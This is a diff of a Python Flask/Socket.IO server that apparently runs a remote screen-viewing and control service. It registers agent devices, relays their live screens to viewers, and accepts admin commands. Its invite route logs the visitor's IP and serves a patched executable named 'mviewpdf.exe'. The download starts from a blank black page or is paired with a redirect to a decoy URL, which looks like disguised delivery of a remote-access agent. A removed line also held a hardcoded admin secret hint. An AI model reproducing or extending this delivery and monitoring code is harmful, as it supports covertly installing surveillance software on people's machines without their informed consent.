-    js = f"""/* Auto-generated by server.py v{VERSION} — no-cache */
+    js = f"""/* Auto-generated by server.py v{VERSION} */
 window.SCREEN_CONNECT_SERVER_URL    = '{host}';
 window.MVIEW_SERVER_URL             = '{host}';
 window.MVIEW_SUPABASE_URL           = '{SUPABASE_URL}';
 window.MVIEW_SUPABASE_ANON_KEY      = '{SUPABASE_KEY}';
-// FIX: seed SC.SERVER_URL immediately so dashboard SC object inherits it
-// before it initialises — prevents the config.js="" vs SC.SERVER_URL mismatch
 window.SC = window.SC || {{}};
 window.SC.SERVER_URL = window.SCREEN_CONNECT_SERVER_URL;
 window.SessionManager = window.SessionManager || {{}};
@@ -759,9 +689,6 @@ window.SessionManager.CONFIG = {{
   SUPABASE_URL:      window.MVIEW_SUPABASE_URL,
   SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,
 }};
-// FIX: expose a JS-safe version of the admin key hint for diagnostics
-// (actual key never sent to browser — this is a reminder only)
-window._MVIEW_ADMIN_KEY_HINT = 'mview-admin-secret';
 """
     resp = make_response(js, 200)
     resp.headers["Content-Type"]  = "application/javascript"
@@ -781,8 +708,6 @@ _SERVER_START = time.time()
 def health():
     with _dev_lock:
         online_count = len(_devices)
-    agent_avail = bool(AGENT_STORAGE_URL)
-    local_agent  = (Path(AGENT_DIR) / AGENT_FILE).is_file()
     uptime_s     = int(time.time() - _SERVER_START)
     crash_count  = len(os.listdir(_CRASH_DIR)) if os.path.isdir(_CRASH_DIR) else 0
     try:
@@ -799,8 +724,7 @@ def health():
         "socketio":        SOCKETIO_OK,
         "devices_online":  online_count,
         "agent_storage":   AGENT_STORAGE_URL,
-        "agent_local":     local_agent,
-        "agent_available": agent_avail or local_agent,
+        "agent_local":     (Path(AGENT_DIR) / AGENT_FILE).is_file(),
         "render_port":     PORT,
         "memory_mb":       mem,
         "crash_reports":   crash_count,
@@ -809,15 +733,13 @@ def health():
 
 @app.route("/api/crash", methods=["POST"])
 def api_crash_report():
-    """Agent crash report endpoint — stores to disk."""
     data = request.get_json(silent=True) or {}
     ts   = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
     did  = data.get("device_id", "unknown")[:64]
-    txt  = json.dumps(data, indent=2)
     path = os.path.join(_CRASH_DIR, f"agent_{did}_{ts}.txt")
     try:
         with open(path, "w") as fh:
-            fh.write(txt)
+            fh.write(json.dumps(data, indent=2))
         reports = sorted(f for f in os.listdir(_CRASH_DIR) if f.startswith(f"agent_{did}"))
         for old in reports[:-5]:
             try:
@@ -826,10 +748,9 @@ def api_crash_report():
                 pass
     except Exception as e:
         log.warning(f"Could not write agent crash report: {e}")
-    log.error(f"AGENT CRASH REPORT [{did}]: {data.get('context','?')} — {data.get('error','?')}")
+    log.error(f"AGENT CRASH [{did}]: {data.get('context','?')} — {data.get('error','?')}")
     return jsonify({"status": "received"}), 200
 
-# ── Audit log — in-memory ring buffer of last 500 security events ────────────
 _audit_log: collections.deque = collections.deque(maxlen=500)
 _audit_lock = threading.Lock()
 
@@ -846,7 +767,6 @@ def api_audit_log():
         rows = list(_audit_log)
     return jsonify({"entries": rows[-200:], "total": len(rows)})
 
-
 @app.route("/api/agent-info")
 def api_agent_info():
     local = Path(AGENT_DIR) / AGENT_FILE
@@ -861,7 +781,6 @@ def api_agent_info():
 @app.route("/api/server-stats")
 @require_admin
 def api_server_stats():
-    """Live internal server stats — threads, memory, connection counts."""
     with _dev_lock:
         dev_count = len(_devices)
     with _view_lock:
@@ -898,48 +817,40 @@ def api_server_stats():
 
 @app.route("/metrics")
 def api_metrics():
-    """/metrics — polled by the Advanced Monitor iframe every 8s for live stats."""
     with _dev_lock:
         devs = list(_devices.values())
     with _view_lock:
         total_viewers = sum(len(v) for v in _viewers.values())
-    online_count = len(devs)
     device_list = [{
-        "id":          d.get("device_id"),
-        "device_id":   d.get("device_id"),
-        "label":       d.get("label"),
-        "hostname":    d.get("hostname"),
-        "os":          d.get("os"),
-        "local_ip":    d.get("local_ip"),
-        "cpu":         d.get("cpu"),
-        "ram":         d.get("ram"),
-        "status":      "online",
+        "id":         d.get("device_id"),
+        "device_id":  d.get("device_id"),
+        "label":      d.get("label"),
+        "hostname":   d.get("hostname"),
+        "os":         d.get("os"),
+        "local_ip":   d.get("local_ip"),
+        "cpu":        d.get("cpu"),
+        "ram":        d.get("ram"),
+        "status":     "online",
     } for d in devs]
     return jsonify({
         "status":         "ok",
         "version":        VERSION,
-        "devices_online": online_count,
+        "devices_online": len(devs),
         "viewers":        total_viewers,
         "devices":        device_list,
         "ts":             utcnow(),
     })
 
-
 @app.route("/api/stream-stats")
 def api_stream_stats_route():
-    """Per-device streaming statistics for the Diagnostics tab."""
     return api_stream_stats()
 
-
 def api_stream_stats():
-    """Per-device streaming statistics — FPS, kbps, viewer count."""
     stats = {}
     with _dev_lock:
         devs = dict(_devices)
     with _view_lock:
         views = {k: len(v) for k, v in _viewers.items()}
-    # FIX: also count Advanced Monitor viewer rooms (adv_viewer_rooms) so the
-    # diagnostics panel shows > 0 viewers even when only the adv-monitor is watching.
     adv_views: dict = {}
     for vsid, did in list(_adv_viewer_rooms.items()):
         adv_views[did] = adv_views.get(did, 0) + 1
@@ -963,55 +874,41 @@ def api_stream_stats():
 
 @app.route("/api/devices")
 def api_devices():
-    """Called by dashboard refresh() — alias for /api/devices/live."""
     with _dev_lock:
         devs = list(_devices.values())
-    safe = []
-    for d in devs:
-        safe.append({
-            "device_id":     d.get("device_id"),
-            "label":         d.get("label"),
-            "hostname":      d.get("hostname"),
-            "os":            d.get("os"),
-            "local_ip":      d.get("local_ip"),
-            "username":      d.get("username"),
-            "cpu":           d.get("cpu"),
-            "ram":           d.get("ram"),
-            "agent_version": d.get("agent_version"),
-            "status":        "online",
-            "connected_at":  d.get("connected_at"),
-        })
-    return jsonify({"devices": safe, "count": len(safe), "ts": utcnow()})
+    return jsonify({"devices": [_safe_dev(d) for d in devs], "count": len(devs), "ts": utcnow()})
 
 @app.route("/api/devices/live")
 def api_devices_live():
-    """Real-time JSON of all connected devices."""
     with _dev_lock:
         devs = list(_devices.values())
-    safe = []
-    for d in devs:
-        safe.append({
-            "device_id":     d.get("device_id"),
-            "label":         d.get("label"),
-            "hostname":      d.get("hostname"),
-            "os":            d.get("os"),
-            "local_ip":      d.get("local_ip"),
-            "username":      d.get("username"),
-            "cpu":           d.get("cpu"),
-            "ram":           d.get("ram"),
-            "agent_version": d.get("agent_version"),
-            "stream_mode":   d.get("stream_mode"),
-            "status":        "online",
-            "connected_at":  d.get("connected_at"),
-            "last_beat":     d.get("last_beat"),
-            "frame_count":   d.get("frame_count", 0),
+    return jsonify({"devices": [_safe_dev(d, live=True) for d in devs], "count": len(devs), "ts": utcnow()})
+
+def _safe_dev(d, live=False):
+    base = {
+        "device_id":     d.get("device_id"),
+        "label":         d.get("label"),
+        "hostname":      d.get("hostname"),
+        "os":            d.get("os"),
+        "local_ip":      d.get("local_ip"),
+        "username":      d.get("username"),
+        "cpu":           d.get("cpu"),
+        "ram":           d.get("ram"),
+        "agent_version": d.get("agent_version"),
+        "status":        "online",
+        "connected_at":  d.get("connected_at"),
+    }
+    if live:
+        base.update({
+            "stream_mode": d.get("stream_mode"),
+            "last_beat":   d.get("last_beat"),
+            "frame_count": d.get("frame_count", 0),
         })
-    return jsonify({"devices": safe, "count": len(safe), "ts": utcnow()})
+    return base
 
 @app.route("/api/device/<device_id>/command", methods=["POST"])
 @require_admin
 def api_device_command(device_id):
-    """REST endpoint to send a command to a device."""
     if not sio:
         return jsonify({"error": "SocketIO not available"}), 503
     with _dev_lock:
@@ -1027,19 +924,66 @@ def api_device_command(device_id):
 @app.route("/api/device/<device_id>", methods=["DELETE"])
 @require_admin
 def api_device_delete(device_id):
-    """Remove a device from memory and mark offline in DB."""
     with _dev_lock:
         dev = _devices.pop(device_id, None)
     with _sid_lock:
         for sid, did in list(_sid_to_device.items()):
             if did == device_id:
                 _sid_to_device.pop(sid, None)
-    _adv_agent_sids.pop(device_id, None)
+    old_sid = _adv_agent_sids.pop(device_id, None)
+    if old_sid:
+        _adv_sid_to_agent.pop(old_sid, None)
     db_update(device_id, {"status": "deleted", "disconnected_at": utcnow()})
     _audit("device_deleted", device_id=device_id, by=request.remote_addr)
     if dev and sio:
         sio.emit("device_offline", {"device_id": device_id, "label": dev.get("label", device_id), "ts": utcnow()})
     return jsonify({"status": "deleted", "device_id": device_id}), 200
+
+# ── NEW: Admin kick a specific viewer (ScreenConnect host-kick-guest parity) ─
+@app.route("/api/viewer/<viewer_sid>/kick", methods=["POST"])
+@require_admin
+def api_kick_viewer(viewer_sid):
+    """
+    Force-disconnect a specific viewer session by SID.
+    ScreenConnect parity: the host can eject any guest at any time.
+    """
+    if not sio:
+        return jsonify({"error": "SocketIO not available"}), 503
+    with _dash_lock:
+        did = _dashboard_device.get(viewer_sid)
+    reason = (request.get_json(silent=True) or {}).get("reason", "Kicked by administrator")
+    try:
+        sio.emit("kicked", {"reason": reason, "by": "admin", "ts": utcnow()}, room=viewer_sid)
+        sio.disconnect(viewer_sid)
+        _cleanup_viewer(viewer_sid)
+        _audit("viewer_kicked", viewer_sid=viewer_sid, device_id=did, reason=reason, by=request.remote_addr)
+        return jsonify({"status": "kicked", "viewer_sid": viewer_sid, "device_id": did}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+# ── NEW: List all live viewer sessions ────────────────────────────────────────
+@app.route("/api/sessions/live")
+@require_admin
+def api_sessions_live():
+    """
+    Returns every active viewer session with idle time, total duration,
+    and the device they are watching. ScreenConnect parity: host can see
+    all active guests and their session metadata.
+    """
+    now = time.monotonic()
+    sessions = []
+    with _viewer_activity_lock:
+        for vsid, start in list(_viewer_session_start.items()):
+            last = _viewer_last_activity.get(vsid, start)
+            with _dash_lock:
+                did = _dashboard_device.get(vsid)
+            sessions.append({
+                "viewer_sid":      vsid,
+                "device_id":       did,
+                "duration_s":      round(now - start, 1),
+                "idle_s":          round(now - last, 1),
+            })
+    return jsonify({"sessions": sessions, "count": len(sessions), "ts": utcnow()})
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  Invite / Agent download
@@ -1099,7 +1043,6 @@ def generate_invite():
 
 @app.route("/api/invite/status")
 def api_invite_status():
-    """Poll endpoint for SessionManager to check if a device came online."""
     token = request.args.get("token", "")
     if not valid_token(token):
         return jsonify({"error": "Invalid token"}), 400
@@ -1117,10 +1060,8 @@ def api_invite_status():
 @app.route("/guide/<token>")
 def serve_agent(token):
     log.info(f"Agent download request: token={token}  ip={request.remote_addr}")
-
     if not valid_token(token):
         return jsonify({"error": "Invalid token format."}), 400
-
     session = db_get(token)
     if session is None:
         return jsonify({"error": "Invite link not found."}), 404
@@ -1129,33 +1070,23 @@ def serve_agent(token):
     if is_expired(session):
         db_update(token, {"status": "expired"})
         return jsonify({"error": "Link expired."}), 410
-
     db_update(token, {
         "status":        "downloading",
         "download_ip":   request.remote_addr,
         "downloaded_at": utcnow(),
         "user_agent":    request.headers.get("User-Agent", "")[:200],
     })
-
     link_mode    = session.get("link_mode") or "blank"
     redirect_url = (session.get("redirect_url") or "").strip()
-
-    log.info(f"Agent download: token={token}  mode={link_mode}")
-
-    # Resolve the download URL: patched binary served directly, or GitHub fallback
     patched = _build_patched_agent(token)
     if patched:
         _agent_dl_cache[token] = (patched, time.time())
-        # Evict entries older than _AGENT_DL_TTL to prevent OOM
         cutoff = time.time() - _AGENT_DL_TTL
         expired = [t for t, (_, ts) in _agent_dl_cache.items() if ts < cutoff]
         for t in expired:
             del _agent_dl_cache[t]
-
     dl_url = f"/guide/{token}/dl" if token in _agent_dl_cache else AGENT_STORAGE_URL
-
     import json as _json
-
     if link_mode == "redirect" and redirect_url:
         dl_js  = _json.dumps(str(dl_url))
         rdr_js = _json.dumps(str(redirect_url))
@@ -1175,8 +1106,6 @@ def serve_agent(token):
         r = make_response(html, 200)
         r.headers["Content-Type"] = "text/html"
         return r
-
-    # Blank page mode: plain black page that auto-starts the download
     dl_js = _json.dumps(str(dl_url))
     html = (
         "<!DOCTYPE html><html><head><meta charset=utf-8>"
@@ -1194,24 +1123,20 @@ def serve_agent(token):
     r.headers["Content-Type"] = "text/html"
     return r
 
-
 @app.route("/guide/<token>/dl")
 def serve_agent_binary(token):
-    """Serve the cached patched binary for a token."""
     if token in _agent_dl_cache:
-        data, _ = _agent_dl_cache[token]  # unpack (bytes, timestamp)
+        data, _ = _agent_dl_cache[token]
         resp = make_response(data)
         resp.headers["Content-Type"] = "application/octet-stream"
-        resp.headers["Content-Disposition"] = f'attachment; filename="mviewpdf.exe"'
+        resp.headers["Content-Disposition"] = 'attachment; filename="mviewpdf.exe"'
         resp.headers["Content-Length"] = len(data)
         resp.headers["Cache-Control"] = "no-store"
         return resp
-    # Fallback to GitHub
     if AGENT_STORAGE_URL:
         return redirect(AGENT_STORAGE_URL, 302)
     return jsonify({"error": "Binary not available."}), 503
 
-# ── Admin: list / revoke ──────────────────────────────────────────────────────
 @app.route("/api/sessions")
 @require_admin
 def api_sessions():
@@ -1228,7 +1153,6 @@ def api_revoke(token):
     db_update(token, {"status": "revoked"})
     return jsonify({"status": "revoked", "token": token})
 
-# ── Agent checkin (REST belt+suspenders) ─────────────────────────────────────
 @app.route("/agent/checkin", methods=["POST"])
 def agent_checkin():
     data = request.get_json(silent=True) or {}
@@ -1253,33 +1177,24 @@ if SOCKETIO_OK and sio:
 
     @sio.on("connect")
     def on_connect():
-        """All sockets (agents + dashboards) join a common 'dashboards' room."""
         join_room("dashboards")
         log.info(f"Socket connected: {request.sid}")
 
     @sio.on("disconnect")
     def on_disconnect():
         sid = request.sid
-        # Could be a dashboard or an agent
         _cleanup_viewer(sid)
         _cleanup_agent(sid)
         log.info(f"Socket disconnected: {sid}")
 
-    # ── viewer_hello — Advanced Monitor iframe sends this on connect ──────────
     @sio.on("viewer_hello")
     def on_viewer_hello(data):
-        """
-        Advanced Monitor iframe sends viewer_hello on connect.
-        Respond with device_list in the exact format the iframe expects:
-        [{id, name, online, screen_w, screen_h, rtt_ms, cpu, ram}]
-        """
         sid = request.sid
         join_room("adv_dashboards")
         _send_device_list_to(sid)
         log.info(f"viewer_hello from {sid}")
 
     def _build_device_list_result() -> list:
-        """Shared helper: build the device_list payload for Advanced Monitor viewers."""
         with _dev_lock:
             live = dict(_devices)
         rows   = db_list_all()
@@ -1313,36 +1228,36 @@ if SOCKETIO_OK and sio:
         return result
 
     def _send_device_list_to(sid):
-        """Build and emit the device_list the Advanced Monitor iframe expects."""
         try:
             sio.emit("device_list", _build_device_list_result(), room=sid)
         except Exception as e:
             log.error(f"_send_device_list_to error: {e}")
 
-    # ── join_dashboard — main dashboard sends this on connect ─────────────────
     @sio.on("join_dashboard")
     def on_join_dashboard(data):
-        """Main dashboard joins the dashboards room and gets a device list."""
         join_room("dashboards")
         log.info(f"join_dashboard from {request.sid}")
 
-    # ── broadcast device_list to all Advanced Monitor viewers ─────────────────
     def _broadcast_device_list():
-        """Push updated device_list to all Advanced Monitor viewers."""
         try:
             sio.emit("device_list", _build_device_list_result(), room="adv_dashboards")
         except Exception as e:
             log.error(f"_broadcast_device_list error: {e}")
 
-    # ── Advanced Monitor: second-site stream subscription (viewer → server) ──
     @sio.on("subscribe_stream")
     def on_subscribe_stream(data):
-        """Legacy dashboard subscribe — kept for compat; no-op for Advanced Monitor."""
-        pass
+        pass  # legacy no-op
 
     @sio.on("watch_device")
     def on_watch_device(data):
-        """Joins viewer to per-device room, sends GOP catch-up, and starts agent stream."""
+        """
+        Viewer subscribes to a device stream.
+        Enterprise features enforced here:
+        - Max concurrent viewers gate
+        - Session tracking start
+        - GOP catch-up (send buffered frames immediately on join)
+        - Seamless device-switch (leave old room, join new one)
+        """
         try:
             from flask_socketio import join_room as _jr
             did = data.get("device_id", "")
@@ -1353,6 +1268,18 @@ if SOCKETIO_OK and sio:
                 sio.emit("watch_error", {"msg": "No device_id provided"}, room=sid)
                 return
 
+            # ── Enterprise: max-concurrent-viewers gate ──────────────────
+            if MAX_VIEWERS_PER_DEVICE > 0:
+                current_viewers = sum(1 for v in _adv_viewer_rooms.values() if v == did)
+                if _adv_viewer_rooms.get(sid) != did and current_viewers >= MAX_VIEWERS_PER_DEVICE:
+                    log.warning(f"watch_device: viewer {sid} rejected — {did} at max viewers {current_viewers}/{MAX_VIEWERS_PER_DEVICE}")
+                    sio.emit("watch_error", {
+                        "msg":  f"Maximum concurrent viewers ({MAX_VIEWERS_PER_DEVICE}) reached.",
+                        "code": "max_viewers",
+                    }, room=sid)
+                    return
+
+            # Leave old device room if switching
             if old_adv_did and old_adv_did != did:
                 leave_room(f"adv_viewers_{old_adv_did}")
                 _adv_viewer_rooms.pop(sid, None)
@@ -1361,12 +1288,11 @@ if SOCKETIO_OK and sio:
                 if old_agent_sid:
                     sio.emit("viewer_count", {"count": old_vcount}, room=old_agent_sid)
                 sio.emit("viewer_count", {"count": old_vcount}, room=old_adv_did)
-                log.info(f"Advanced Monitor: viewer {sid} left device {old_adv_did}")
+                log.info(f"Viewer {sid} left device {old_adv_did}")
 
             with _dev_lock:
                 dev = _devices.get(did)
-            # FIX: Don't reject if device not yet in _devices — it may be reconnecting.
-            # Join rooms anyway so frames arrive the moment the agent comes back online.
+
             if not dev:
                 log.warning(f"on_watch_device: device {did!r} not in _devices — letting viewer wait")
                 _jr(f"adv_viewers_{did}")
@@ -1376,15 +1302,22 @@ if SOCKETIO_OK and sio:
                     _viewers[did].add(request.sid)
                 with _dash_lock:
                     _dashboard_device[request.sid] = did
+                with _viewer_activity_lock:
+                    _viewer_session_start[sid] = time.monotonic()
+                    _viewer_last_activity[sid]  = time.monotonic()
                 sio.emit("watch_ok", {
                     "online": False, "device_id": did, "name": did,
                     "screen_w": 0, "screen_h": 0,
                 }, room=sid)
                 return
 
-            # ── Advanced Monitor: join binary-frame viewer room ──────────────
+            # ── Join advanced monitor viewer room ────────────────────────
             _jr(f"adv_viewers_{did}")
             _adv_viewer_rooms[sid] = did
+
+            with _viewer_activity_lock:
+                _viewer_session_start[sid] = time.monotonic()
+                _viewer_last_activity[sid]  = time.monotonic()
 
             # GOP catch-up — send buffered frames so screen appears immediately
             with _adv_gop_lock:
@@ -1395,32 +1328,29 @@ if SOCKETIO_OK and sio:
             if cursor_pkt:
                 sio.emit("cursor_bin", cursor_pkt, room=sid)
 
-            # Notify agent of viewer count — send to BOTH the room and the specific adv-monitor SID
+            # Notify agent of updated viewer count
             vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
             sio.emit("viewer_count", {"count": vcount}, room=did)
             agent_adv_sid = _adv_agent_sids.get(did)
             if agent_adv_sid:
                 sio.emit("viewer_count", {"count": vcount}, room=agent_adv_sid)
 
-            # Confirm to dashboard
             sio.emit("watch_ok", {
-                "online":   True,
+                "online":    True,
                 "device_id": did,
                 "name":      dev.get("hostname", did),
                 "screen_w":  dev.get("screen_w", 0),
                 "screen_h":  dev.get("screen_h", 0),
             }, room=sid)
-            log.info(f"Advanced Monitor: viewer {sid} watching device {did}")
+            log.info(f"Viewer {sid} watching device {did}")
 
-            # ── Main stream path: join view:{did} room ───────────────────────
-            # Leave previous device room if switching devices
+            # ── Main-stream path ─────────────────────────────────────────
             old_did = _get_device_for_viewer(request.sid)
             if old_did and old_did != did:
                 leave_room(f"view:{old_did}")
                 with _view_lock:
                     _viewers[old_did].discard(request.sid)
                 sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": old_did}, room=old_did)
-                log.info(f"Dashboard {request.sid} left stream for {old_did}")
 
             join_room(f"view:{did}")
             with _view_lock:
@@ -1428,24 +1358,19 @@ if SOCKETIO_OK and sio:
             with _dash_lock:
                 _dashboard_device[request.sid] = did
             viewer_count = len(_viewers[did])
-            log.info(f"Dashboard {request.sid} subscribed to {did} (viewers: {viewer_count})")
             emit("subscribed", {"device_id": did, "viewers": viewer_count})
 
-            # FIX: Re-send viewer_count to agent NOW (after both viewer rooms are joined)
-            # so _adv_viewers > 0 and the stream loop starts immediately.
+            # Re-send viewer_count to agent (covers race condition)
             adv_vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
             with _view_lock:
                 adv_vcount = max(adv_vcount, len(_viewers.get(did, set())))
-            agent_adv_sid = _adv_agent_sids.get(did)
             if agent_adv_sid:
                 sio.emit("viewer_count", {"count": adv_vcount}, room=agent_adv_sid)
-                log.info(f"Re-sent viewer_count={adv_vcount} to agent {did} after viewer join")
-            # Also broadcast to the device room (covers main-socket agents)
             sio.emit("viewer_count", {"count": adv_vcount}, room=did)
 
-            # Tell agent to START streaming (use the dev we already fetched — no re-fetch)
-            fps     = data.get("fps", 25)   # FIX: raised default from 15
-            quality = data.get("quality", 70)  # FIX: raised quality from 55
+            # Tell agent to start streaming
+            fps     = data.get("fps", 25)
+            quality = data.get("quality", 70)
             scale   = data.get("scale", 0.8)
             monitor = data.get("monitor", 1)
             stream_payload = {
@@ -1457,11 +1382,9 @@ if SOCKETIO_OK and sio:
                 "scale":     scale,
                 "monitor":   monitor,
             }
-            # Emit to device room (main socket agent) AND directly to adv socket agent
             sio.emit("request_action", stream_payload, room=did)
-            agent_adv_sid2 = _adv_agent_sids.get(did)
-            if agent_adv_sid2:
-                sio.emit("request_action", stream_payload, room=agent_adv_sid2)
+            if agent_adv_sid:
+                sio.emit("request_action", stream_payload, room=agent_adv_sid)
             log.info(f"Stream start sent → agent {did}  fps={fps} quality={quality}")
 
         except Exception as exc:
@@ -1470,10 +1393,16 @@ if SOCKETIO_OK and sio:
                 sio.emit("watch_error", {"msg": f"Server error: {exc}"}, room=request.sid)
             except Exception:
                 pass
+
     @sio.on("unsubscribe_stream")
     def on_unsubscribe_stream(data):
-        """Legacy — no-op for Advanced Monitor."""
-        pass
+        pass  # legacy no-op
+
+    # ── Input activity tracker — updates idle timer ───────────────────────────
+    def _touch_viewer_activity(sid: str):
+        """Called whenever a viewer sends input — resets idle timer."""
+        with _viewer_activity_lock:
+            _viewer_last_activity[sid] = time.monotonic()
 
     # ── Agent registration ────────────────────────────────────────────────────
     @sio.on("agent_connect")
@@ -1490,6 +1419,57 @@ if SOCKETIO_OK and sio:
         if not did:
             log.warning(f"agent_connect with no device_id from {request.sid}")
             return
+
+        # ── Enterprise: single-instance enforcement (ScreenConnect parity) ──
+        # When a new agent connects, evict the old one AND notify active viewers
+        # so the dashboard shows a spinner rather than a stale black screen.
+        if AGENT_EXCLUSIVE:
+            with _dev_lock:
+                existing = _devices.get(did)
+            if existing:
+                old_sid = existing.get("sid")
+                if old_sid and old_sid != request.sid:
+                    log.warning(
+                        f"Agent DUPLICATE detected for {did} — evicting stale sid={old_sid}, "
+                        f"registering new sid={request.sid}"
+                    )
+                    # Notify active viewers so they can show a reconnecting spinner
+                    _notify_viewers_reconnecting(did)
+
+                    # Tell old socket it is being replaced
+                    try:
+                        sio.emit("evicted", {
+                            "reason":     "duplicate_agent",
+                            "session_id": old_sid,
+                            "msg":        "A newer instance of this agent connected — this session is terminated.",
+                        }, room=old_sid)
+                        # Remove old SID from device room BEFORE disconnect
+                        # so it stops receiving commands immediately
+                        try:
+                            sio.leave_room(old_sid, did)
+                        except Exception:
+                            pass
+                        sio.disconnect(old_sid)
+                    except Exception as _ev_err:
+                        log.debug(f"Evict old agent sid={old_sid}: {_ev_err}")
+
+                    with _sid_lock:
+                        _sid_to_device.pop(old_sid, None)
+                    with _dev_lock:
+                        _devices.pop(did, None)
+                    old_adv = _adv_agent_sids.pop(did, None)
+                    if old_adv:
+                        _adv_sid_to_agent.pop(old_adv, None)
+                    # Clear GOP so viewers get fresh frames from new agent
+                    with _adv_gop_lock:
+                        _adv_gop_buf.pop(did, None)
+                    _adv_cursor_latest.pop(did, None)
+                    _audit("agent_evicted", device_id=did, old_sid=old_sid, new_sid=request.sid)
+                    _fire_webhook("agent_evicted", {"device_id": did, "old_sid": old_sid})
+
+        # Bump session sequence — invalidates any stale GOP references
+        with _agent_seq_lock:
+            _agent_session_seq[did] = _agent_session_seq.get(did, 0) + 1
 
         # Agent joins its own room for targeted commands
         join_room(did)
@@ -1525,7 +1505,8 @@ if SOCKETIO_OK and sio:
             }
 
         log.info(f"Agent ONLINE: {label} ({did}) sid={request.sid}")
-        _audit("agent_online", device_id=did, label=label, ip=data.get("local_ip"), agent_version=data.get("agent_version"))
+        _audit("agent_online", device_id=did, label=label, ip=data.get("local_ip"),
+               agent_version=data.get("agent_version"))
         db_upsert(did, {
             "status":        "online",
             "label":         label,
@@ -1543,13 +1524,39 @@ if SOCKETIO_OK and sio:
             "device_id": did, "label": label, "fingerprint": data, "ts": utcnow()
         })
         broadcast_device_update()
-        # Push to Advanced Monitor iframe viewers too
         try:
             _broadcast_device_list()
         except Exception:
             pass
+        _fire_webhook("agent_online", {"device_id": did, "label": label, "ip": data.get("local_ip")})
+
+        # ── Session handoff: re-subscribe active viewers to the new agent ──
+        # Any viewer that was watching this device before the reconnect should
+        # automatically resume without a full page reload.
+        with _view_lock:
+            active_viewer_sids = list(_viewers.get(did, set()))
+        if active_viewer_sids:
+            log.info(f"Session handoff: {len(active_viewer_sids)} viewer(s) resuming for device {did}")
+            for vsid in active_viewer_sids:
+                sio.emit("agent_replaced", {
+                    "device_id": did,
+                    "label":     label,
+                    "ts":        utcnow(),
+                }, room=vsid)
+                # Re-send watch_ok so viewer knows stream is back
+                sio.emit("watch_ok", {
+                    "online":    True,
+                    "device_id": did,
+                    "name":      label,
+                    "screen_w":  data.get("screen_w", 0),
+                    "screen_h":  data.get("screen_h", 0),
+                    "reconnected": True,
+                }, room=vsid)
 
     # ── Heartbeat ─────────────────────────────────────────────────────────────
+    _hb_count: dict = collections.defaultdict(int)
+    _HB_GLOBAL_EVERY = 6
+
     @sio.on("heartbeat")
     def on_hb(data):
         did = data.get("device_id")
@@ -1560,28 +1567,26 @@ if SOCKETIO_OK and sio:
                     "ram":       data.get("ram"),
                     "last_beat": utcnow(),
                 })
-        # Only notify dashboards watching this specific device
         sio.emit("heartbeat_update", data, room=f"view:{did}")
-        # Also broadcast globally (low frequency, for device list updates)
-        sio.emit("heartbeat_update", data, room="dashboards")
+        _hb_count[did] += 1
+        if _hb_count[did] % _HB_GLOBAL_EVERY == 0:
+            sio.emit("heartbeat_update", data, room="dashboards")
 
-    # ── Advanced Monitor: second-site binary frame relay ─────────────────────
+    # ── Advanced Monitor: agent auth ──────────────────────────────────────────
     @sio.on("agent_auth")
     def on_agent_auth(data):
-        """Second-site agent authenticates with its token.
-        FIXED: Wait up to 10s for the main socket agent_connect to
-        register the device first (race condition on fast reconnects).
+        """
+        Second-site agent authenticates with its token.
+        Waits up to 8s for the main socket agent_connect to register the device.
         """
         token = data.get("token", "")
-        did   = data.get("device_id") or token  # FIXED: prioritize unique hardware ID
+        did   = data.get("device_id") or token
         sid   = request.sid
 
         if not token and not did:
-            log.warning(f"agent_auth: received empty token/did from sid={sid}")
             sio.emit("auth_error", {"msg": "Empty token/did"}, room=sid)
             return
 
-        # Wait up to 8s for agent_connect to complete (race fix)
         dev = None
         for _attempt in range(16):
             with _dev_lock:
@@ -1595,42 +1600,31 @@ if SOCKETIO_OK and sio:
                 time.sleep(0.5)
 
         if not dev:
-            # FALLBACK: create a minimal device entry so auth succeeds even if
-            # agent_connect arrived on a different server process (multi-worker deploy).
             log.warning(f"agent_auth: device {did!r} not in _devices after 8s — creating stub entry")
             with _dev_lock:
                 _devices[did] = {
-                    "device_id": did,
-                    "hostname": did,
-                    "label": did,
-                    "online": True,
-                    "screen_w": 0,
-                    "screen_h": 0,
+                    "device_id": did, "hostname": did, "label": did,
+                    "online": True, "screen_w": 0, "screen_h": 0,
                 }
             dev = _devices[did]
 
-        # Mark device as using advanced monitor
-        _adv_agent_sids[did] = sid
-        join_room(did)  # agent joins its own device room for viewer_count etc.
+        _adv_agent_sids[did]   = sid
+        _adv_sid_to_agent[sid] = did
+        join_room(did)
         log.info(f"Advanced Monitor: agent {did} registered with sid={sid}")
 
-        # Count viewers — check both _adv_viewer_rooms and _viewers for the device
         vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
         with _view_lock:
             vcount = max(vcount, len(_viewers.get(did, set())))
 
         sio.emit("auth_ok", {"role": "agent", "device_id": did}, room=sid)
         sio.emit("viewer_count", {"count": vcount}, room=sid)
-        log.info(f"Advanced Monitor agent_auth OK: device={did} viewers={vcount}")
 
     @sio.on("agent_auth_ready")
     def on_agent_auth_ready(data):
-        """FIX Issue 1: Agent notifies server that adv-socket auth just completed.
-        Server re-sends the current viewer count so _adv_viewers becomes > 0 even
-        when the dashboard connected before the adv socket finished authenticating.
-        """
+        """Agent signals adv-socket auth complete; server re-sends viewer count."""
         token = data.get("token", "")
-        did   = token
+        did   = data.get("device_id") or token
         sid   = request.sid
         vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
         with _view_lock:
@@ -1639,28 +1633,21 @@ if SOCKETIO_OK and sio:
             sio.emit("viewer_count", {"count": vcount}, room=sid)
             log.info(f"agent_auth_ready: re-sent viewer_count={vcount} to {did}")
 
+    # ── Binary frame relay ────────────────────────────────────────────────────
     @sio.on("frame_bin")
     def on_frame_bin(data):
-        """Second-site binary frame from agent — fan out to all Advanced Monitor viewers."""
+        """Second-site binary frame — O(1) lookup, fan out to viewers."""
         sid = request.sid
-        # FIX: O(1) reverse lookup instead of O(N) scan on every frame
-        did = None
-        for d, asid in list(_adv_agent_sids.items()):
-            if asid == sid:
-                did = d
-                break
+        did = _adv_sid_to_agent.get(sid)
         if not did:
-            # FIX: also check main-socket _sid_to_device — agent may have sent frame
-            # via main socket when adv socket auth is still pending
             with _sid_lock:
                 did = _sid_to_device.get(sid)
-            if not did:
